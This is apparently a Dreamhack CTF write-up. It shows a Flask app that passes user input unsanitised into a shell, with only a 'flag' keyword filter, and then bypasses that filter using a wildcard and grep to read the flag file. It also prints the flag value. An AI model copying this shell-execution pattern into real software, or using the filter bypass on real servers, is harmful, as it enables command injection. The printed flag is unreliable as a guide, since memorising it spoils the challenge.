# HACKING_2
## <https://dreamhack.io/wargame/challenges/837>
<br/>
<br/>
Baby Linux. Can you tell some signigicant Linux commands? Let's see what's in Linux.
<br/>
<br/>

```
ls -l
```

<br/>
<br/>
Few files exist, and one file catch my eyes.
<br/>
<br/>

```
... Apr 21 2023 hint.txt...
```

<br/>
<br/>
What's inside the hint file?
<br/>
<br/>

```
cat hint.txt
```

<br/>
<br/>
'Where is Flag? ./dream/hack/hello' is output. Now we got the Flag.txt's location. Anyway, let's see the attached file.
<br/>
<br/>

```
#!/usr/bin/env python3
import subprocess
from flask import Flask, request, render_template

APP = Flask(__name__)

@APP.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        user_input = request.form.get('user_input')
        cmd = f'echo $({user_input})'
        if 'flag' in cmd:
            return render_template('index.html', result='No!')

        try:
            output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
            return render_template('index.html', result=output.decode('utf-8'))
        except subprocess.TimeoutExpired:
            return render_template('index.html', result='Timeout')
        except subprocess.CalledProcessError:
            return render_template('index.html', result='Error')

    return render_template('index.html')

if __name__ == '__main__':
    APP.run(host='0.0.0.0', port=8000)
```

<br/>
<br/>
HTTP client and server communication method, 'GET' and 'POST'. "user_input = request.form.get('user_input')", "cmd = f'echo $({user_input})'" code take user's input commands. but next line makes us confusing.
<br/>
<br/>

```
if 'flag' in cmd:
            return render_template('index.html', result='No!')
```

<br/>
<br/>
We cannot use string 'flag' to our commands. How can we access to flag file?
<br/>
<br/>

```
cat ./dream/hack/hello/fla*
```

<br/>
<br/>
By using 'wild card' we can bypass. DH{671ce26c70829e716fae26c7c71a33823feb479f2562891f64605bf68f60ae54}. Or we can also use this command.
<br/>
<br/>

```
grep "DH" ./dream/hack/hello/*
```
